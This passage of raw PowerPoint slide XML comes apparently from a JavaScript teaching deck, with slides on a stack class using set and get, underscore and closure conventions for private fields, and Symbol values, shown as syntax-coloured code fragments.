          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Stack Using Set and Get</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7D34D3F-28D2-4EE7-A344-D381983660A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1396243"/>
            <a:ext cx="10972800" cy="5068888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</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Stack</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constructor</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this</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stack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = [];</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a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>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value</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this</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stack</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push</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value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get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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this</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stack</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pop</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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Stack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a: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2</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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1</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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latest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undefined</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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B039EF3-A80B-4C1C-8207-17CDDF46B95F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using _ to signify private / protected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD50CB49-7AD2-4B5F-898E-52635707FA55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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constructor</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this</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public</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this</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private</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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getAge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return</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this</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setAge</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newAge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this</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newAge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var</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a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person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"John"</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25</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p</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getAge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p</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setAge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>26</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p</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getAge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26</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100</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not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>really</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private</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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100</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delete</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_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>gone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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"Jane"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p</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p</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Jane </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>undefined</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="339126817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92C8718-57D2-416B-91BA-450342B62329}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using Closure for Emulating Private</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE1F8854-6F20-4BA6-869D-D6AEDE5D2BE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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_</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private</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {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public</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stuff</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here</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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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public</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getAge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> () </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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_</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>setAge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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newAge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;</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_</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newAge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p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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"John"</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25</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p</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getAge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delete</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won't</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affect</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anything</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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setAge</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26</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p</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getAge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p</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undefined</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p</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_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>age</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undefined</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </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p</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"Jane"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console</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log</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p</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name</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getAge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI"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108272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9CBF0B4-03E1-4166-A5C4-5F5F25787980}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274638"/>
            <a:ext cx="10972800" cy="850106"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Symbol</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{308DE312-0CE4-4AE6-B99D-9D0BCA215136}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1268760"/>
            <a:ext cx="10972800" cy="5165724"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A symbol value is created by invoking the function Symbol, which dynamically produces an anonymous, unique value. A symbol may be used as an object property and create "hidden" properties.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Symbols don't auto convert to strings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Symbol can have an optional description, but for debugging purposes only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Symbols can be local or global.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Symbol keys are ignored when iterating and object with for .. in loop</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new_symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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local</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symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>description</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new_symbol2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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description</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with</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description</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a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new_symbol2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>global_symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>global</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>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global</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>symbol</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err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Symbol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>keyFor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
